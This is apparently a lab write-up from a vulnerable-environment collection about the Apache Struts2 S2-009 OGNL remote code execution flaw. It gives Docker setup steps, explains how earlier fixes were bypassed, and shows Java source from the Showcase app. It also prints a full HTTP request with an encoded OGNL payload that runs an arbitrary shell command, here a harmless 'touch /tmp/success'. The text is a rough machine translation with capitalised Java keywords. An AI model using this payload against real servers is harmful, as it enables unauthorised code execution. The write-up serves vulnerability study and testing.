# S2-009 Remote Code Execution Vulnerability

Impact version: 2.1.0 - 2.3.1.1

Vulnerability details: http://struts.apache.org/docs/s2-009.html

## Test environment construction

```
Docker-compose build
Docker-compose up -d
```

## Principle

> Front reading: This vulnerability is again from s2-003, s2-005. To understand the principle of the vulnerability, you need to read the instructions of s2-005: https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md

Refer to [Struts2 vulnerability analysis of the Ognl expression feature triggered by a new idea] (https://www.t00ls.net/viewthread.php?tid=21197), the text said that the introduction of ognl method may not only appear in this vulnerability It may also appear in other Java applications.

Struts2's repair method for s2-003 is to prohibit `#`, so s2-005 is bypassed by using the code `\u0023` or `\43`; then Struts2's repair method for s2-005 is forbidden `\` Special symbols that prevent users from submitting backslashes.

However, if a parameter ʻexample` is accepted in the current action, this parameter will enter the OGNL context. So, we can put the OGNL expression in the `example` parameter and then execute it using `/helloword.acton?example=<OGNL statement>&(example)('xxx')=1` The official defense against special characters such as `#`, `\`.

## Exploit Construction

The test environment is a struts2 "feature display" website `Struts Showcase`, the code is a lot, our goal is to find an action that accepts the parameter, the parameter type is string.

First decompress `S2-009.war` (I use binwalk, in fact, direct zip can be), visible source code is in the `WEB-INF/src` directory, I generally look for ajax related code, the general logic comparison of these codes simple.

Find a `WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java`:

```java
Public class Example5Action extends ActionSupport {

    Private static final long serialVersionUID = 2111967621952300611L;

    Private String name;
    Private Integer age;


    Public String getName() { return name; }
    Public void setName(String name) { this.name = name; }

    Public Integer getAge() { return age; }
    Public void setAge(Integer age) { this.age = age; }

    @Override
    Public String execute() throws Exception {
        Return SUCCESS;
    }
}
```

The code is not simpler. It accepts the name parameter and calls setName to assign it to the private property `this.name`, which is in line with our requirements. Then go to `WEB-INF/src/java/struts-ajax.xml` to see the URL routing:

```xml
<package name="ajax" extends="struts-default">
    ...
    <action name="example5" class="org.apache.struts2.showcase.ajax.Example5Action">
        <result name="input">/ajax/tabbedpanel/example5.jsp</result>
        <result>/ajax/tabbedpanel/example5Ok.jsp</result>
    </action>
    ...
</package>
```

`name=example5`, so access the controller by visiting `http://your-ip:8080/ajax/example5.action`. According to the method mentioned in the principle, put the OGNL exploit code in the name parameter and access the URL:

```
GET /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]% 3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&z [%28name%29%28%27meh%27%29]=true HTTP/1.1
Host: localhost:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


```

Since the POC is not echoed, the `touch /tmp/success` command is called, and the /tmp directory is found to have succeeded:

![](1.png)

In the case of a black box, this hole is not particularly limited. As long as you find the place to pass the parameters in the normal business, you can try this parameter name.